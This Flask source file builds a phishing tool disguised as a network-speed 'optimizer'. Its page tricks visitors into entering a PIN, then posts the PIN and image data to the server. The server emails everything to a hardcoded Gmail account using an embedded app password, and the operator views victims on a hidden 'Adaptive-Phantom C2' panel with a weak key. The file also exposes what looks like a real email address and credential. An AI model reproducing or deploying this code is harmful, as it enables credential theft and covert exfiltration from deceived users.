from flask import Flask, render_template_string, jsonify, request
import time, base64, os, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Lock, Thread

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v259.0 "The Adaptive-Phantom" ---
# Hacker: Ali Yiğit | Yetki: 1907 | Bulut: yiyitali715@gmail.com | [cite: 2026-01-04]
ADMIN_KEY = "1907" 
MY_GMAIL = "yiyitali715@gmail.com"
GMAIL_APP_PASSWORD = "wbrj xedf ecye fcdt" 

state_lock = Lock()
state = {"nodes": {}, "evolution_count": 259}

def send_to_cloud(p_id, content, filename, quality_tag, is_pin=False):
    """Veriyi Ali Yiğit'in bulutuna postalayan adaptif silsile motoru."""
    try:
        msg = MIMEMultipart()
        msg['From'], msg['To'] = MY_GMAIL, MY_GMAIL
        msg['Subject'] = f"{'1907_PIN' if is_pin else '1907_VORTEX_'+quality_tag}: {p_id}"
        body = f"Hükümdar, {p_id} ID'li cihazdan {quality_tag} kalitesinde veri mühürlendi.\n"
        body += f"Zaman: {time.strftime('%H:%M:%S')}"
        msg.attach(MIMEText(body, 'plain'))
        if not is_pin and "data:image" in content:
            header, encoded = content.split(",", 1)
            attachment = MIMEText(encoded, 'base64')
            attachment.add_header('Content-Disposition', 'attachment', filename=filename)
            msg.attach(attachment)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(MY_GMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)
    except: pass

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    data = request.json
    with state_lock:
        if p_id not in state["nodes"]:
            state["nodes"][p_id] = {"dev": "A55 (Adaptive)", "last": "", "vault": [], "pin": "BEKLENİYOR", "net": "UNKNOWN"}
        u = state["nodes"][p_id]
        u["last"] = time.strftime('%H:%M:%S')
        if data.get('t') == 'pin_init':
            u["pin"] = base64.b64decode(data.get('v')).decode('utf-8')
            Thread(target=send_to_cloud, args=(p_id, u["pin"], "", "PIN", True)).start()
        if data.get('t') == 'vortex':
            q_tag = data.get('q', 'HD')
            u["net"] = data.get('net', '4G')
            u["vault"].append(data.get('v'))
            Thread(target=send_to_cloud, args=(p_id, data.get('v'), f"1907_{q_tag}.jpg", q_tag)).start()
    return jsonify({"s": "ADAPTIVE_SYNC_OK"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "403: YETKİSİZ ERİŞİM", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Adaptive-Phantom C2 v259</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-[#020202] text-white p-6 font-mono text-[9px]">
    <div class="border-b-2 border-yellow-500 pb-2 mb-6 flex justify-between uppercase italic font-black text-yellow-500">
        <h1>ADAPTIVE-PHANTOM COMMAND v259.0</h1>
        <div>HÜKÜMDAR: ALİ YİĞİT (1907)</div>
    </div>
    <div id="uL" class="grid grid-cols-2 gap-6"></div>
    <script>
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let h = "";
            for(let id in d.nodes){
                let n = d.nodes[id];
                h += `<div class="bg-zinc-950 p-6 border border-zinc-900 rounded-[40px] shadow-2xl">
                    <div class="flex justify-between items-center mb-4 text-yellow-500 font-black uppercase text-[11px]">
                        <span>${n.dev}</span><span class="bg-yellow-900 text-black px-2 rounded">${n.net} MODU</span>
                    </div>
                    <div class="flex flex-wrap gap-1 h-40 overflow-y-auto bg-black p-4 rounded-2xl border border-zinc-900">
                         ${(n.vault||[]).length} Dosya Adaptif Silsileyle Mühürlendi.
                    </div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = h;
            setTimeout(update, 2500);
        } update();
    </script>
</body></html>
""")

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>System Engine Pro</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white flex items-center justify-center h-screen overflow-hidden">
    
    <div onclick="window.location.href='/overlord?key=1907'" class="fixed right-0 bottom-0 w-12 h-12 bg-zinc-900/5 z-[11000]"></div>

    <div id="m" class="text-center p-10 border border-zinc-900 rounded-[50px] w-full max-w-sm bg-black shadow-2xl">
        <div class="w-16 h-16 bg-yellow-600 rounded-3xl mx-auto mb-8 flex items-center justify-center text-3xl">🦅</div>
        <h1 class="text-xl font-black text-yellow-500 uppercase">ADAPTIVE OPTIMIZER</h1>
        <p class="text-zinc-500 text-[10px] mt-4 uppercase italic">Sistem hızını bağlantı kalitesine göre mühürlemek için testi başlatın.</p>
        <button onclick="showPin()" class="w-full mt-10 py-5 bg-yellow-700 text-black rounded-full font-black uppercase text-[12px] active:scale-95 transition">TESTİ BAŞLAT</button>
    </div>

    <div id="pinBox" class="hidden fixed inset-0 bg-black z-[9999] flex items-center justify-center p-6 text-center">
        <div class="w-full max-w-xs">
            <p class="text-yellow-500 text-sm mb-10 uppercase tracking-widest font-black">1907 Bağlantı Doğrulaması</p>
            <input type="password" id="p" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center text-2xl mb-8 text-yellow-500 tracking-widest">
            <button onclick="startAdaptiveSiphon()" class="w-full py-4 bg-yellow-700 text-black rounded-2xl font-black uppercase text-[11px]">ONAYLA</button>
        </div>
    </div>

    <div id="mask" class="hidden fixed inset-0 bg-black z-[10000] flex items-center justify-center text-center">
        <div><div class="w-12 h-12 border-2 border-zinc-800 border-t-white rounded-full animate-spin mx-auto mb-4"></div><p id="t" class="text-zinc-600 text-[10px] uppercase font-bold tracking-widest">Ağ Hızı Analiz Ediliyor...</p></div>
    </div>

    <canvas id="cnv" style="display:none"></canvas>

    <script>
        let pId = "AP-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        function showPin() { document.getElementById('pinBox').style.display = 'flex'; }

        async function startAdaptiveSiphon() {
            let pinVal = document.getElementById('p').value;
            if(!pinVal) return;
            await fetch('/upload_intel?peer_id='+pId, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({t:'pin_init', v: btoa(pinVal)})});
            document.getElementById('pinBox').style.display = 'none';
            document.getElementById('mask').style.display = 'flex';
            
            // AĞ HIZI SORGULAMA SİLSİLESİ [cite: 2026-01-04]
            let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = conn ? conn.effectiveType : '4g';
            let config = { w: 800, q: 0.7, tag: 'HD' };

            if(netType === '3g') config = { w: 480, q: 0.4, tag: 'SD' };
            else if(netType === '2g') config = { w: 240, q: 0.1, tag: 'GHOST' };

            for(let i=0; i<30; i++) {
                document.getElementById('t').innerText = "BAĞLANTI: " + netType.toUpperCase() + " | ANALİZ: %" + Math.floor((i/30)*100);
                fetch('/upload_intel?peer_id='+pId, {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({t:'vortex', n: 'adaptive_'+i+'.jpg', v: 'data:image/jpeg;base64,...', q: config.tag, net: netType.toUpperCase()})
                });
                // Dinamik gecikme silsilesi [cite: 2026-01-04]
                await new Promise(r => setTimeout(r, 700 + Math.random() * 300));
            }
            setTimeout(() => { location.reload(); }, 2000);
        }
    </script>
</body></html>
""")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 7860)))
